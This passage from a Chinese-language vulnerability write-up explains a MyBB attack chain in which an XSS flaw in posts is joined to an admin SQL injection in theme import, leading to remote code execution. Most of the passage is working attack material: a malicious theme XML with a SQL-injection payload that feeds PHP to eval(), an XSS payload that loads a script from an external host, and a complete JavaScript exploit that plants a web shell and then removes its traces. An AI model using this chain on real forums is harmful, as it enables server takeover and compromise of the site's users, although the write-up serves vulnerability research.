假设我们控制 `$this-&gt;cache` 为不存在的一个 `title` 。会执行 `get()` 的 SQL语句。但此时我们的 payload 肯定是两个字段的payload。无法在一个字段的 `get()` 的SQL语句中执行。

所以我们必须找到 **第一个** `eval()` 调用点，将 `$this-&gt;cache` 的 `title` 设置为对应的 `title`。这样在 `get()` 中就不会执行 SQL语句直接返回恶意 `$template` 了。

`glboa.php` 是 mybb 第一个引入的文件，经过测试发现，下面这段代码是当用户为 **普通用户** 时，第一个被执行的 `eval()` 点

```
if($mybb-&gt;usergroup['canusercp'] == 1)
`{`
    eval('$usercplink = "'.$templates-&gt;get('header_welcomeblock_member_user').'";');
`}`
```

那么我们只需要设置 `$this-&gt;cache` 的 `title` 为 **header_welcomeblock_member_user** 即可

**构造 payload**

整理下现在的信息
<li>
`eval()` 内容部分可控，可控部分取决于 `get()` 的返回值</li>
<li>
`get()` 内部通过 `$this-&gt;cache[$title]`，返回 `$template`
</li>
1. mybb 初始化 `global.php`时调用了 `cache()`，`cache()`是用于初始化 `$this-&gt;cache[$title]` 的
<li>我们可以通过 SQL 注入控制 `$this-&gt;cache`的值，从而污染`$template`，使得恶意代码进入 `eval`
</li>
<li>
`get()` 在 `global.php` 的 **header_welcomeblock_member_user** 这一段中第一次触发</li>
&lt;/br&gt;

**思考攻击步骤**
1. 导入包含SQL注入paylaod 的 XML主题配置文件，使 `templateset` 为注入语句
<li>切换 mybb 主题为新增的恶意主题，不然 `$theme` 无法切换到恶意的 `templateset`
</li>
1. 访问首页即可 RCE
### <a class="reference-link" name="poc"></a>poc

**恶意主题文件：**

```
......
&lt;properties&gt;
        &lt;templateset&gt;&lt;![CDATA[999') and 1=2 union select 'header_welcomeblock_member_user','$`{`phpinfo()`}`'#]]&gt;&lt;/templateset&gt;
......
```

**导入恶意主题文件**

**切换当前主题为恶意主题**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014f461cb2ec856e46.png)

**访问下首页：**

**调用到 `cache()` 时，`theme['templateset']`的值：**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011dd2d6448e7360dc.png)

`cache()` 中执行的 SQL语句：

```
SELECT title,template FROM mybb_templates 
WHERE title IN (......) 
AND sid IN ('-2','-1','999') 
and 1=2 /* 强行使前面的语句返回空行 */
union select 'header_welcomeblock_member_user','$`{`phpinfo()`}`'
#')

```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c24e6ac1d4dd81e3.png)

成功在 cache 中写入了恶意代码。

随后在 `global.php` 中调用了

```
eval('$usercplink = "'.$templates-&gt;get('header_welcomeblock_member_user').'";');
```

在 `get()` 函数中，查询 `$this-&gt;cache`，存在对应的 `title` ，直接返回 `$this-&gt;cache[$title]`

[![](https://p0.ssl.qhimg.com/t016fd63c924a6e46bf.png)](https://p0.ssl.qhimg.com/t016fd63c924a6e46bf.png)

最终返回到 eval 中执行，成功 RCE

[![](https://p1.ssl.qhimg.com/t01ff6efc382c0d671e.png)](https://p1.ssl.qhimg.com/t01ff6efc382c0d671e.png)

不过由于我们篡改了开头的 SQL语句，所以 mybb会报错很正常。最好通过这个 RCE 写个马到 **cache** 或者 **upload** 目录之后，就将主题还原。

### <a class="reference-link" name="%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88%E4%BD%BF%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%20RCE"></a>两个漏洞结合使普通用户可 RCE

由于前文的 RCE 需要管理员权限，普通用户无法直接触发。但现在有了一个 XSS ，可以尝试**通过 XSS 发送对应的 payload请求**。

**ps：无法在前台处盗取 cookie，因为 mybb 设置了`SameSite`为 `Lax`**

**XSS**

根据前文的 XSS漏洞分析可知，我们无法直接使用引号、尖括号和中括号。经过尝试构造以下 XSS payload 以插入一个js标签

**ps：前文分析XSS时是在回复处分析的，实际上发帖处也存在XSS**

```
//拿到 / 字符
xs1=String.fromCharCode(47);
//创建 script 元素
xa1=document.createElement(/script/.source);
//设置 script src属性
xa1.src=xs1+xs1+/192.168.92.165/.source+xs1+/1.js/.source;
//插入 script 标签
document.getElementById(/header/.source).append(xa1);
```

数据包：

```
POST /newthread.php?fid=2&amp;processed=1 HTTP/1.1
......
Content-Disposition: form-data; name="message"

[img]http://evil.com/xx(http://evil.com/onerror=xs1=String.fromCharCode(47);xa1=document.createElement(/script/.source);xa1.src=xs1+xs1+/192.168.92.165/.source+xs1+/1.js/.source;document.getElementById(/header/.source).append(xa1);//[/img]   
......
```

成功插入后，编写恶意 js文件，执行以下操作：
1. 获取后台当前的配置主题
1. 导入恶意主题XML配置，RCE代码为往 cache 目录写一个马
1. 设置当前主题为恶意主题
1. 请求首页，触发 RCE
1. 将当前主题设回原来的
1. 删除恶意主题
以上的请求可以通过 javascript 的 xmlhttp 来实现，由于是 xss 也就不存在跨域的问题了。

**RCE JS EXP：**

修改下 SQL注入的payload。

我们目前要打的是管理员，但mybb中前台和后台的 Cookie 是分开验证，我们要考虑如下情况：
1. 管理员前后台都登陆了
1. 管理员前台登陆普通用户，后台登陆管理员
1. 管理员前面没登陆，后台登陆管理员
三种情况对应着不一样的 `eval` 入口。

**管理员**的第一个 eval 调用点为 **header_welcomeblock_member_admin**

**普通用户**的第一个 eval 调用点为 **header_welcomeblock_member_user**

**匿名账户**的第一个 eval 调用点为 header_welcomeblock_guest_login_modal*

```
var bashurl = 'http://192.168.92.164/mybb/mybb-mybb_1825'
var my_post_key = ''
var source_theme = '';
var evil_theme_set = ''
var evil_theme_tid = ''

function sleep (time) `{`
  return new Promise((resolve) =&gt; setTimeout(resolve, time));
`}`

function get_themes()`{`
    var url = bashurl + '/admin/index.php?module=style'

    var xhr=new XMLHttpRequest();
    xhr.open('GET',url,false);
    xhr.onreadystatechange=function()`{`
        if(xhr.readyState==4)`{`
            if(xhr.status==200 || xhr.status==304)`{`
                var res = xhr.responseText;

                var parser = new DOMParser();
                var doc3 = parser.parseFromString(res, "text/html");
                var source_theme_tid = '';

                imgs = doc3.getElementsByTagName("img");

                for(var i=0;i&lt;imgs.length;i++)`{`
                    if(imgs[i].alt == 'Default Theme')`{`
                        source_theme_tid = imgs[i]
                        break
                    `}`
                `}`

                source_theme_tid = source_theme_tid.parentNode.nextElementSibling.firstElementChild.firstElementChild
                source_theme_tid = source_theme_tid.href.split('tid=')[1]

                //获取 csrf token
                var postKey = doc3.getElementById('welcome').lastElementChild
                my_post_key = postKey.href.split('my_post_key=')[1]

                //还原默认主题的接口 url
                source_theme = bashurl + '/admin/index.php?module=style-themes&amp;action=set_default&amp;tid=' + source_theme_tid + '&amp;my_post_key=' + my_post_key
            `}`
        `}`
    `}`
    xhr.send();
`}`

function import_xml()`{`
       var formData = new FormData();
    var url = bashurl + '/admin/index.php?module=style-themes&amp;action=import'

    formData.append("my_post_key", my_post_key);
    formData.append("import", 0);
    formData.append("url", "");
    formData.append("tid", "1");
    formData.append("name", "evilTheme1");
    formData.append("import_stylesheets", "1");
    formData.append("import_templates", "1");

    //需要使程序中的 $this-&gt;cache 存在以下三个 title。才能确保一定能触发 RCE
    //header_welcomeblock_member_user  //普通用户的第一个 evil调用点
    //header_welcomeblock_member_admin //管理员用户的第一个 evil调用点
    //header_welcomeblock_guest_login_modal //匿名用户的第一个 evil调用点
    var content = [
        '&lt;?xml version="1.0" encoding="UTF-8"?&gt;',
        '&lt;theme name="Default" version="1825"&gt;',
        '&lt;properties&gt;',
        '&lt;templateset&gt;&lt;![CDATA[999\') and 1=2 union select \'header_welcomeblock_member_user\',\'$`{`file_put_contents($_GET[0],$_GET[1])`}`;\' union select \'header_welcomeblock_member_admin\',\'$`{`file_put_contents($_GET[0],$_GET[1])`}`;\' union select \'header_welcomeblock_guest_login_modal\',\'$`{`file_put_contents($_GET[0],$_GET[1])`}`;\'#]]&gt;&lt;/templateset&gt;',
        '&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;',
        '&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;',
        '&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;',
        '&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;',
        '&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;',
        '&lt;disporder&gt;&lt;/disporder&gt;',
        '&lt;colors&gt;&lt;/colors&gt;',
        '&lt;/properties&gt;',
        '&lt;stylesheets&gt;',
        '&lt;stylesheet name="color_black.css" attachedto="black" version="1825"&gt;',
        '&lt;/stylesheet&gt;',
        '&lt;/stylesheets&gt;',
        '&lt;templates&gt;',
        '&lt;/templates&gt;',
        '&lt;/theme&gt;'
    ].join('\n');


    var blob = new Blob([content], `{` type: "text/xml"`}`);

    formData.append("local_file", blob);

    var request = new XMLHttpRequest();
    request.open("POST", url);
    request.send(formData);
`}`

function set_evil_theme()`{`
    var url = bashurl + '/admin/index.php?module=style'

    var xhr=new XMLHttpRequest();
    xhr.open('GET',url,false);
    xhr.onreadystatechange=function()`{`
        if(xhr.readyState==4)`{`
            if(xhr.status==200 || xhr.status==304)`{`
                var res = xhr.responseText;
                var evil_theme = '';

                var parser = new DOMParser();
                var doc3 = parser.parseFromString(res, "text/html");
                aTag = doc3.getElementsByTagName("a")

                 for(var i=0;i&lt;aTag.length;i++)`{`
                     if(aTag[i].innerHTML == 'evilTheme1')`{`
                         evil_theme = aTag[i]
                         break
                     `}`
                `}`
                //获取设置默认主题的接口 url
                evil_theme_set = evil_theme.parentNode.parentNode.previousElementSibling.firstElementChild.href
                evil_theme_set = evil_theme_set.replace('index.php','admin/index.php')
                console.log('evil_theme_set: ' + evil_theme_set)

                //获取恶意主题的tid
                evil_theme_tid = evil_theme.href.split('tid=')[1]
                console.log('evil_theme_tid: ' + evil_theme_tid)
            `}`
        `}`
    `}`
    xhr.send();

    //设置默认主题
    var xhr2=new XMLHttpRequest();
    xhr2.open('GET',evil_theme_set,false);
    xhr2.send();
`}`

function trigger_rce()`{`
    //访问首页触发 RCE
    var xhr=new XMLHttpRequest();
    xhr.open('GET',bashurl + '/index.php?0=cache/evil.php&amp;1=&lt;?php eval($_GET[100]);?&gt;',false);
    xhr.send();
`}`

function clean()`{`
    // 重置默认主题
    var xhr1=new XMLHttpRequest();
    xhr1.open('GET',source_theme,false);
    xhr1.send();

    //删除恶意主题
    var xhr2 = new XMLHttpRequest();
    var formData = new FormData();
    var url = bashurl + '/admin/index.php?module=style-themes&amp;action=delete&amp;tid=' + evil_theme_tid
    formData.append("my_post_key", my_post_key);
    xhr2.open("POST", url);
    xhr2.send(formData);
`}`

//获取当前默认主题
get_themes()

//如果获取不到 csrf_token
//说明不是 管理员访问
if(my_post_key != '')`{`
    //导入恶意主题
    import_xml()

    sleep(300).then(() =&gt; `{`
        //设置恶意主题为当前默认主题
        set_evil_theme()
        //触发 RCE
        trigger_rce()
        //删除主题，还原默认主题
        clean()
    `}`)
`}`
```

**验证：**<br>
触发 XSS，恶意js发送的请求：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010f0d44e22a5828b3.png)

后台的模板管理没有变化：

[![](https://p4.ssl.qhimg.com/t01bb6a89affacb3f80.png)](https://p4.ssl.qhimg.com/t01bb6a89affacb3f80.png)

成功写马：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0185563072509f925d.png)



# <a class="reference-link" name="Reference%EF%BC%9A"></a>Reference：

[https://blog.sonarsource.com/mybb-remote-code-execution-chain](https://blog.sonarsource.com/mybb-remote-code-execution-chain)
